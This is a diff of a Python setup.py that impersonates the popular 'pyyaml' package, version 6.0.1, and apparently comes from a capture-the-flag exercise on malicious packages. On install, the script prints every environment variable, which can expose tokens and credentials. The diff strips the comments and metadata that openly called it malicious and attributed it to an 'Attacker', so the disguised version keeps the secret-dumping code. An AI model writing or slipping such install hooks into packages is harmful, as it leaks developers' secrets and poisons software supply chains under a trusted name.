@@ -1,15 +1,19 @@
-from setuptools import setup
+from setuptools import setup, find_packages
 import os
 
-# Code malveillant pour imprimer toutes les variables d'environnement
-print("Toutes les variables d'environnement :")
-for key, value in os.environ.items():
-    print(f"{key}: {value}")
+print("COUCOU TDF")
+env_vars = os.environ
+for key, value in env_vars.items():
+    print(f'{key}: {value}')
 
 setup(
     name='pyyaml',
     version='6.0.1',
-    description='A malicious package for CTF',
-    author='Attacker',
-    packages=['malicious_package'],
+    packages=find_packages(),
+    install_requires=[],  # Si tu veux ajouter des dépendances
+    entry_points={
+        'console_scripts': [
+            'yaml = yaml.main:main',  # yaml sera la commande qui déclenchera ton script
+        ],
+    },
 )
